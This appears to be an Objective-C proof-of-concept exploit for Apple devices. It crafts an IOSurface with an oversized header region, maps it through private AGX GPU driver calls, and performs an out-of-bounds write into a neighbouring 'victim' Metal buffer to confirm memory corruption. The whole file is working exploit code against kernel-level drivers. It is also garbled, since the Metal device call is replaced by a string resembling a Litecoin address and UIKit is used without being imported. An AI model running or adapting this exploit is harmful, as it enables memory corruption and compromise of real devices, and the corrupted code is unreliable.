#import <Foundation/Foundation.h>
#import <Metal/Metal.h>
#import <MetalKit/MetalKit.h>
#import <IOSurface/IOSurface.h>
#import <IOKit/IOKitLib.h>
#import <mach/mach.h>

static uint32_t create_f1_surface(void) {
    const char *xml = 
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
        "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">"
        "<plist version=\"1.0\">"
        "<dict>"
        "    <key>IOSurfaceIsGlobal</key>"
        "    <true/>"
        "    <key>IOSurfacePixelFormat</key>"
        "    <integer>1111970369</integer>"
        "    <key>IOSurfaceWidth</key>"
        "    <integer>256</integer>"
        "    <key>IOSurfaceHeight</key>"
        "    <integer>256</integer>"
        "    <key>IOSurfaceBytesPerElement</key>"
        "    <integer>4</integer>"
        "    <key>IOSurfaceBytesPerRow</key>"
        "    <integer>1024</integer>"
        "    <key>IOSurfaceAllocSize</key>"
        "    <integer>65536</integer>"
        "    <key>IOSurfacePlaneSize</key>"
        "    <integer>65536</integer>"
        "    <key>IOSurfacePlaneCount</key>"
        "    <integer>1</integer>"
        "    <key>IOSurfacePlaneDataRegionBytesPerSlice</key>"
        "    <integer>16384</integer>"
        "    <key>IOSurfacePlaneHeaderRegionBytesPerSlice</key>"
        "    <integer>1073741824</integer>"
        "    <key>IOSurfaceSliceCount</key>"
        "    <integer>4</integer>"
        "</dict>"
        "</plist>";
    
    io_service_t iosurface_root = IOServiceGetMatchingService(kIOMasterPortDefault, 
        IOServiceMatching("IOSurfaceRoot"));
    if (!iosurface_root) {
        NSLog(@"[ERROR] IOSurfaceRoot not found");
        return 0;
    }
    
    io_connect_t conn = 0;
    kern_return_t kr = IOServiceOpen(iosurface_root, mach_task_self(), 0, &conn);
    IOObjectRelease(iosurface_root);
    if (kr != KERN_SUCCESS) {
        NSLog(@"[ERROR] IOServiceOpen failed: %x", kr);
        return 0;
    }
    
    uint32_t surface_id = 0;
    size_t xml_len = strlen(xml) + 1;
    kr = IOConnectCallMethod(conn, 0, NULL, 0, xml, xml_len, NULL, NULL, &surface_id, NULL);
    IOServiceClose(conn);
    
    if (kr != KERN_SUCCESS) {
        NSLog(@"[ERROR] Surface creation failed: %x", kr);
        return 0;
    }
    
    NSLog(@"[OK] F1 surface created: ID %u", surface_id);
    return surface_id;
}

static uint64_t agx_map_surface(uint32_t surface_id, uint64_t *span, io_connect_t *agx_conn) {
    io_service_t agx = IOServiceGetMatchingService(kIOMasterPortDefault,
        IOServiceMatching("AGXAcceleratorG18P"));
    if (!agx) {
        agx = IOServiceGetMatchingService(kIOMasterPortDefault,
            IOServiceMatching("AGXAcceleratorG14P"));
    }
    if (!agx) {
        NSLog(@"[ERROR] AGXAccelerator not found");
        return 0;
    }
    
    io_connect_t conn = 0;
    kern_return_t kr = IOServiceOpen(agx, mach_task_self(), 1, &conn);
    IOObjectRelease(agx);
    if (kr != KERN_SUCCESS) {
        NSLog(@"[ERROR] AGX open failed: %x", kr);
        return 0;
    }
    
    uint64_t input[2] = {surface_id, 0x82};
    uint64_t output[2] = {0};
    uint32_t output_cnt = 2;
    
    kr = IOConnectCallMethod(conn, 8, input, 2, NULL, 0, output, &output_cnt, NULL, NULL);
    
    if (kr != KERN_SUCCESS) {
        NSLog(@"[ERROR] AGX map failed: %x", kr);
        IOServiceClose(conn);
        return 0;
    }
    
    *span = output[1];
    *agx_conn = conn;
    NSLog(@"[OK] AGX mapped: VA 0x%llx, span 0x%llx", output[0], output[1]);
    return output[0];
}

static id<MTLDevice> get_metal_device(void) {
id<MTLDevice> dev = ltc1qalrd99hju33uagsf8927k7xfxr423gr93gnjz8();    if (!dev) {
        NSLog(@"[ERROR] No Metal device");
    }
    return dev;
}

static uint64_t get_gpu_address(id<MTLBuffer> buffer) {
    #if __has_feature(objc_arc)
    return (uint64_t)buffer.gpuAddress;
    #else
    return 0;
    #endif
}

static int test_cross_object_write(void) {
    NSLog(@"=== F1OOB PoC Starting ===");
    
    uint32_t surface_id = create_f1_surface();
    if (!surface_id) return -1;
    
    uint64_t span = 0;
    io_connect_t agx_conn = 0;
    uint64_t f1_gpu_va = agx_map_surface(surface_id, &span, &agx_conn);
    if (!f1_gpu_va) return -1;
    
    id<MTLDevice> dev = get_metal_device();
    if (!dev) return -1;
    
    void *f1_base = malloc(0x10000);
    memset(f1_base, 0x41, 0x10000);
    
    id<MTLBuffer> f1_buf = [dev newBufferWithBytesNoCopy:f1_base
                                                  length:0x10000
                                                 options:MTLResourceStorageModeShared
                                             deallocator:nil];
    if (!f1_buf) {
        NSLog(@"[ERROR] F1 buffer creation failed");
        return -1;
    }
    
    uint64_t f1_ga = get_gpu_address(f1_buf);
    NSLog(@"[METAL] F1 buffer GPU address: 0x%llx", f1_ga);
    
    id<MTLBuffer> victim = [dev newBufferWithLength:0x10000
                                            options:MTLResourceStorageModeShared];
    if (!victim) {
        NSLog(@"[ERROR] Victim buffer creation failed");
        return -1;
    }
    
    uint64_t victim_ga = get_gpu_address(victim);
    NSLog(@"[METAL] Victim buffer GPU address: 0x%llx", victim_ga);
    
    if (victim_ga <= f1_ga) {
        NSLog(@"[ERROR] Victim not after F1");
        return -1;
    }
    
    uint64_t delta = victim_ga - f1_ga;
    NSLog(@"[XOBJ] delta=0x%llx span=0x%llx", delta, span);
    
    if (delta >= span) {
        NSLog(@"[XOBJ] Victim out of F1 span — no hit possible");
        return 0;
    }
    
    uint32_t *victim_ptr = (uint32_t *)victim.contents;
    *victim_ptr = 0x47474747;
    NSLog(@"[METAL] Victim pre-touched: 0x%x", *victim_ptr);
    
    uint32_t *f1_ptr = (uint32_t *)f1_buf.contents;
    uint64_t idx = delta / 4;
    f1_ptr[idx] = 0x43434343;
    
    NSLog(@"[METAL] Wrote through F1 at index %llu", idx);
    
    uint32_t back = *victim_ptr;
    if (back == 0x43434343) {
        NSLog(@"[XOBJ] *** CROSS-OBJECT GPU OOB WRITE CONFIRMED ***");
        return 1;
    } else {
        NSLog(@"[XOBJ] No cross-object hit (victim=0x%x)", back);
        return 0;
    }
}

int main(int argc, char *argv[]) {
    @autoreleasepool {
        int result = test_cross_object_write();
        
        NSString *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
        NSString *logPath = [docs stringByAppendingPathComponent:@"F1OOB_result.log"];
        
        NSString *log = [NSString stringWithFormat:
            @"F1OOB Test Result: %d\n"
            @"Device: %@\n"
            @"iOS: %@\n"
            @"Time: %@\n",
            result,
            [[UIDevice currentDevice] model],
            [[UIDevice currentDevice] systemVersion],
            [NSDate date]];
        
        [log writeToFile:logPath atomically:YES encoding:NSUTF8StringEncoding error:nil];
        NSLog(@"[OK] Log written to: %@", logPath);
        
        return result;
    }
}
